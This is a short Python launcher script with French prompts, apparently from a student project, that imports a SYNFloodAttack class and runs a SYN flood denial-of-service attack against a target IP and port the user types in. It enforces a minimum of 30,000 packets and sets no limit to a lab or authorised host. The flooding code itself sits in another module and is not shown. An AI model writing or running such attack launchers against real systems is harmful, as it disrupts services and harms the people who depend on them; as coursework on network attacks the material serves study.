from Partie_2.SYNFloodAttack import SYNFloodAttack
                                                          
def main():

    target_ip = input("Entrez l'IP de la cible : ")
    target_port = int(input("Entrez le port de la cible : "))
    num_packets = int(input("Entrez le nombre de paquets à envoyer (min 30,000): "))
    if num_packets < 30000:
        num_packets = 30000
    attack = SYNFloodAttack(target_ip, target_port, num_packets)
    attack.attack()

if __name__ == "__main__":
    main()